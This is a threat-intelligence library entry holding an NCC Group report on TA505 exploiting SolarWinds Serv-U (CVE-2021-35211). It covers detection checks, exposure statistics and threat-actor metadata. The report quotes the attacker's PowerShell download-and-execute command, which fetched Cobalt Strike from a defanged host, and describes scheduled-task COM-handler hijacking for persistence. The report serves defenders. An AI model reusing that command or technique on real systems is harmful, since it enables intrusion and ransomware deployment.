# 0-raw-data/ORKL/library/jsons_entries/77957be3-51af-4519-ab30-2f3e1d3639b0.json
{
    "id": "77957be3-51af-4519-ab30-2f3e1d3639b0",
    "created_at": "2022-10-25T16:48:11.227307Z",
    "updated_at": "2025-03-27T02:15:37.990262Z",
    "deleted_at": null,
    "sha1_hash": "d12903008af0fa50b26f425731eac32f8cd70bd2",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-11-10T02:44:03Z",
    "file_modification_date": "2021-11-10T02:44:03Z",
    "file_size": 264231,
    "plain_text": "# TA505 exploits SolarWinds Serv-U vulnerability (CVE- 2021-35211) for initial access\n\n**research.nccgroup.com/2021/11/08/ta505-exploits-solarwinds-serv-u-vulnerability-cve-2021-35211-for-initial-**\naccess\n\nNovember 8, 2021\n\nNCC Group’s global Cyber Incident Response Team has observed an increase in Clop\nransomware victims in the past weeks. The surge can be traced back to a vulnerability in\nSolarWinds Serv-U that is being abused by the TA505 threat actor. TA505 is a known\ncybercrime threat actor, who is known for extortion attacks using the Clop ransomware.\nWe believe exploiting such vulnerabilities is a recent initial access technique for TA505,\ndeviating from the actor’s usual phishing-based approach.\n\nNCC Group strongly advises updating systems running SolarWinds Serv-U software to\nthe most recent version (at minimum version 15.2.3 HF2) and checking whether\nexploitation has happened as detailed below.\n\nWe are sharing this information as a call to action for organisations using SolarWinds\nServ-U software and incident responders currently dealing with Clop ransomware.\n\n## Modus Operandi\n\n### Initial Access\n\nDuring multiple incident response investigations, NCC Group found that a vulnerable\nversion of SolarWinds Serv-U server appeared to be the initial access used by TA505 to\nbreach its victims’ IT infrastructure. The vulnerability being exploited is known as CVE2021-35211 [1].\n\nSolarWinds published a security advisory [2] detailing the vulnerability in the Serv-U\nsoftware on July 9, 2021. The advisory mentions that Serv-U Managed File Transfer and\nServ-U Secure FTP are affected by the vulnerability. On July 13, 2021, Microsoft\npublished an article [3] on CVE-2021-35211 being abused by a Chinese threat actor\nreferred to as DEV-0322. Here we describe how TA505, a completely different threat\nactor, is exploiting that vulnerability.\n\nSuccessful exploitation of the vulnerability, as described by Microsoft [3], causes Serv-U\nto spawn a subprocess controlled by the adversary. That enables the adversary to run\ncommands and deploy tools for further penetration into the victim’s network.\nExploitation also causes Serv-U to log an exception, as described in the section below on\nchecks for potential compromise.\n\n### Execution\n\n\n-----\n\nWe observed that Base64 encoded PowerShell commands were logged shortly after the\nServ-U exceptions indicating exploitation. The PowerShell commands ultimately led to\ndeployment of a Cobalt Strike Beacon on the system running the vulnerable Serv-U\nsoftware.\n\nThe PowerShell command observed deploying Cobalt Strike was:\n```\npowershell.exe -nop -w hidden -c IEX ((new-object\nnet.webclient).downloadstring('hxxp://IP:PORT/a'))\n\n### Persistence\n\n```\nOn several occasions the threat actor tried to maintain its foothold by hijacking a\nscheduled task named RegIdleBackup and abusing the COM handler associated with it to\nexecute malicious code, leading to FlawedGrace RAT.\n\nThe RegIdleBackup task is a legitimate task that is stored in\n\\Microsoft\\Windows\\Registry. The task is normally used to regularly backup the registry\nhives. By default, the CLSID in the COM handler is set to: {CA767AA8-9157-4604-B64B40747123D5F2}. In all cases where we observed the threat actor abusing the task for\npersistence, the COM handler was altered to a different CLSID.\n\nCLSID objects are stored in registry in HKLM\\SOFTWARE\\Classes\\CLSID. In our\ninvestigations the task included a suspicious CLSID, which subsequently redirected to\nanother CLSID. The second CLSID included three objects containing the FlawedGrace\nRAT loader. The objects contain Base64 encoded strings that ultimately lead to the\nexecutable.\n\n## Checks for potential compromise\n\n### Check for exploitation of Serv-U\n\nNCC Group recommends looking for potentially vulnerable Serv-U FTP-servers in your\nnetwork and checking these logs for traces of similar exceptions as suggested by the\nSolarWinds security advisory. It is important to note that the publications by Microsoft\nand SolarWinds describe follow-up activity regarding a completely different threat actor\nthan we observed in our investigations.\n\nMicrosoft’s article [3] on CVE-2021-35211 provides guidance on the detection of the\nabuse of the vulnerability. The first indicator of compromise for the exploitation of this\nvulnerability are suspicious entries in a Serv-U log file named DebugSocketlog.txt. This\nlog file is usually located in the Serv-U installation folder. Looking at this log file it\ncontains exceptions at the time of exploitation of CVE-2021-35211. NCC Group’s analysts\nencountered the following exceptions during their investigations:\n\n```\nEXCEPTION: C0000005; CSUSSHSocket::ProcessReceive();\n\n```\n\n-----\n\nHowever, as mentioned in Microsoft’s article, this exception is not by definition an\nindicator of successful exploitation and therefore further analysis should be carried out to\ndetermine potential compromise.\n\n### Check for suspicious PowerShell commands\n\nAnalysts should look for suspicious PowerShell commands being executed close to the\ndate and time of the exceptions. The full content of PowerShell commands is usually\nrecorded in Event ID 4104 in the Windows Event logs.\n\n### Check for RegIdleBackup task abuse\n\nAnalysts should look for the RegIdleBackup task with an altered CLSID. Subsequently,\nthe suspicious CLSID should be used to query the registry and check for objects\ncontaining Base64 encoded strings. The following PowerShell commands assist in\nchecking for the existence of the hijacked task and suspicious CLSID content:\n```\n# Check for altered RegIdleBackup task\nExport-ScheduledTask -TaskName \"RegIdleBackup\" -TaskPath\n\"\\Microsoft\\Windows\\Registry\\\" | Select-String -NotMatch \"{CA767AA8-91574604-B64B-40747123D5F2}\"\n# Check for suspicious CLSID registry key content\nGet-ChildItem -Path 'HKLM:\\SOFTWARE\\Classes\\CLSID{SUSPICIOUS_CLSID}'\n\n### Summary of checks\n\n```\nThe following steps should be taken to check whether exploitation led to a suspected\ncompromise by TA505:\n\nCheck if your Serv-U version is vulnerable\nLocate the Serv-U’s DebugSocketlog.txt\nSearch for entries such as ‘EXCEPTION: C0000005;\nCSUSSHSocket::ProcessReceive();’ in this log file\nCheck for Event ID 4104 in the Windows Event logs surrounding the date/time of\nthe exception and look for suspicious PowerShell commands\nCheck for the presence of a hijacked Scheduled Task named RegIdleBackup using\nthe provided PowerShell command\n\nIn case of abuse: the CLSID in the COM handler should NOT be set to\n{CA767AA8-9157-4604-B64B-40747123D5F2}\nIf the task includes a different CLSID: check the content of the CLSID objects in the\nregistry using the provided PowerShell command, returned Base64 encoded strings\ncan be an indicator of compromise.\n\n## Vulnerability Landscape\n\n\n-----\n\nThere are currently still many vulnerable internet-accessible Serv-U servers online\naround the world.\n\nIn July 2021 after Microsoft published about the exploitation of Serv-U FTP servers by\nDEV-0322, NCC Group mapped the internet for vulnerable servers to gauge the potential\nimpact of this vulnerability. In July, 5945 (~94%) of all Serv-U (S)FTP services identified\non port 22 were potentially vulnerable. In October, three months after SolarWinds\nreleased their patch, the number of potentially vulnerable servers is still significant at\n2784 (66.5%).\n\nThe top countries with potentially vulnerable Serv-U FTP services at the time of writing\nare:\n\n\n-----\n\n**Amount** **Country**\n\n**1141** China\n\n**549** United States\n\n**99** Canada\n\n**92** Russia\n\n**88** Hong Kong\n\n**81** Germany\n\n**65** Austria\n\n**61** France\n\n**57** Italy\n\n**50** Taiwan\n\n**36** Sweden\n\n**31** Spain\n\n**30** Vietnam\n\n**29** Netherlands\n\n**28** South Korea\n\n**27** United Kingdom\n\n**26** India\n\n**21** Ukraine\n\n**18** Brazil\n\n**17** Denmark\n\nTop vulnerable versions identified:\n\n\n-----\n\n**Amount** **Version**\n\n**441** SSH-2.0-Serv-U_15.1.6.25\n\n**236** SSH-2.0-Serv-U_15.0.0.0\n\n**222** SSH-2.0-Serv-U_15.0.1.20\n\n**179** SSH-2.0-Serv-U_15.1.5.10\n\n**175** SSH-2.0-Serv-U_14.0.1.0\n\n**143** SSH-2.0-Serv-U_15.1.3.3\n\n**138** SSH-2.0-Serv-U_15.1.7.162\n\n**102** SSH-2.0-Serv-U_15.1.1.108\n\n**88** SSH-2.0-Serv-U_15.1.0.480\n\n**85** SSH-2.0-Serv-U_15.1.2.189\n\n## MITRE ATT&CK mapping\n\n**Tactic** **Technique** **Procedure**\n\n\nInitial\nAccess\n\n\nT1190 – Exploit\nPublic Facing\nApplication(s)\n\n\nTA505 exploited CVE-2021-35211 to gain remote\ncode execution.\n\nTA505 used Base64 encoded PowerShell\ncommands to download and run Cobalt Strike\nBeacons on target systems.\n\nTA505 hijacked a scheduled task named\nRegIdleBackup and abused the COM handler\nassociated with it to execute malicious code and\ngain persistence.\n\nTA505 altered the registry so that the\nRegIdleBackup scheduled task executed the\nFlawedGrace RAT loader, which was stored as\nBase64 encoded strings in the registry.\n\n\nExecution T1059.001 –\nCommand and\nScripting\nInterpreter:\nPowerShell\n\nPersistence T1053.005 –\nScheduled\nTask/Job:\nScheduled Task\n\n\nDefense\nEvasion\n\n## References\n\n\nT1112 – Modify\nRegistry\n\n\n\n[[1] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35211](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35211)\n\n[[2] https://www.solarwinds.com/trust-center/security-advisories/cve-2021-35211](https://www.solarwinds.com/trust-center/security-advisories/cve-2021-35211)\n\n[3] https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat\n\n-----\n\n[actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/](https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2021/2021.11.08.TA505_SolarWinds/TA505%20exploits%20SolarWinds%20Serv-U%20vulnerability%20%28CVE-2021-35211%29%20for%20initial%20access%20%E2%80%93%20NCC%20Group%20Research.pdf"
    ],
    "report_names": [
        "TA505 exploits SolarWinds Serv-U vulnerability (CVE-2021-35211) for initial access – NCC Group Research"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0a80df4d-5ab7-4ca3-809d-8ef7b5a54f1f",
            "created_at": "2023-11-21T02:00:07.386886Z",
            "updated_at": "2025-03-27T02:00:03.248375Z",
            "deleted_at": null,
            "main_name": "TiltedTemple",
            "aliases": [
                "DEV-0322",
                "Circle Typhoon"
            ],
            "source_name": "MISPGALAXY:TiltedTemple",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716491,
    "ts_updated_at": 1743041737,
    "ts_creation_date": 1636512243,
    "ts_modification_date": 1636512243,
    "files": {
        "pdf": "https://archive.orkl.eu/d12903008af0fa50b26f425731eac32f8cd70bd2.pdf",
        "text": "https://archive.orkl.eu/d12903008af0fa50b26f425731eac32f8cd70bd2.txt",
        "img": "https://archive.orkl.eu/d12903008af0fa50b26f425731eac32f8cd70bd2.jpg"
    }
}